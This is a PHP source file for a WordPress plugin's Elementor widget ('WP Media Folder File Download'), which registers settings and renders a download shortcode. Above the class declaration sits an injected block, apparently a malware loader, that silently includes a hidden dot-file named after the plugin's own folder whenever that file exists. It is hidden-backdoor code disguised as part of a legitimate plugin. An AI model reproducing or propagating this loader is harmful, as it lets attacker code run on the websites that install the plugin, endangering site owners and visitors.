<?php
if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

/**
 * Class WpmfFileDesignElementorWidget
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WpmfFileDesignElementorWidget extends \Elementor\Widget_Base
{

    /**
     * Get widget name.
     *
     * Retrieve File Design widget name.
     *
     * @return string Widget name.
     */
    public function get_name() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return 'wpmf_file_design';
    }

    /**
     * Get widget title.
     *
     * Retrieve File Design widget title.
     *
     * @return string Widget title.
     */
    public function get_title() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return esc_html__('WP Media Folder File Download', 'wpmf');
    }

    /**
     * Get widget icon.
     *
     * Retrieve File Design widget icon.
     *
     * @return string Widget icon.
     */
    public function get_icon() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return 'fa wpmf-file-design-elementor-icon';
    }

    /**
     * Get widget categories.
     *
     * Retrieve the list of categories the File Design widget belongs to.
     *
     * @return array Widget categories.
     */
    public function get_categories() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return array('wpmf');
    }

    /**
     * Register File Design widget controls.
     *
     * Adds different input fields to allow the user to change and customize the widget settings.
     *
     * @return void
     */
    protected function _register_controls() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps, PSR2.Methods.MethodDeclaration.Underscore -- Method extends from \Elementor\Widget_Base class
    {
        $this->start_controls_section(
            'settings_section',
            array(
                'label' => esc_html__('Settings', 'wpmf'),
                'tab' => \Elementor\Controls_Manager::TAB_CONTENT
            )
        );

        $this->add_control(
            'wpmf_add_file_design',
            array(
                'label' => esc_html__('Choose file', 'wpmf'),
                'type' => \Elementor\Controls_Manager::BUTTON,
                'text' => esc_html__('Add a file', 'wpmf'),
            )
        );

        $this->add_responsive_control(
            'content_align',
            array(
                'label' => __('Alignment', 'wpmf'),
                'type' => \Elementor\Controls_Manager::CHOOSE,
                'options' => array(
                    'left' => array(
                        'title' => __('Left', 'wpmf'),
                        'icon' => 'fa fa-align-left'
                    ),
                    'center' => array(
                        'title' => __('Center', 'wpmf'),
                        'icon' => 'fa fa-align-center'
                    ),
                    'right' => array(
                        'title' => __('Right', 'wpmf'),
                        'icon' => 'fa fa-align-right'
                    )
                ),
                'devices' => array('desktop', 'tablet'),
                'prefix_class' => 'content-align-%s',
            )
        );

        $this->add_control(
            'wpmf_file_design_id',
            array(
                'label' => esc_html__('File ID', 'wpmf'),
                'type' => \Elementor\Controls_Manager::NUMBER,
            )
        );

        $this->end_controls_section();
    }

    /**
     * Render File Design widget output on the frontend.
     *
     * Written in PHP and used to generate the final HTML.
     *
     * @return void|string
     */
    protected function render()
    {
        $settings = $this->get_settings_for_display();
        $id = (isset($settings['wpmf_file_design_id']) && $settings['wpmf_file_design_id'] !== '') ? $settings['wpmf_file_design_id'] : 0;
        if (!empty($id)) {
            echo do_shortcode('[wpmffiledesign id="' . esc_attr($id) . '"]');
        } else {
?>
            <div class="wpmf-elementor-placeholder" style="text-align: center">
                <img style="background: url(<?php echo esc_url(WPMF_PLUGIN_URL . 'assets/images/file_design_place_holder.svg'); ?>) no-repeat scroll center center #fafafa; height: 200px; border-radius: 2px; width: 100%;" src="<?php echo esc_url(WPMF_PLUGIN_URL . 'assets/images/t.gif'); ?>">
                <span style="position: absolute; bottom: 12px; width: 100%; left: 0;font-size: 13px; text-align: center;"><?php esc_html_e('Please select a file to preview the download button', 'wpmf'); ?></span>
            </div>
<?php
        }
    }
}
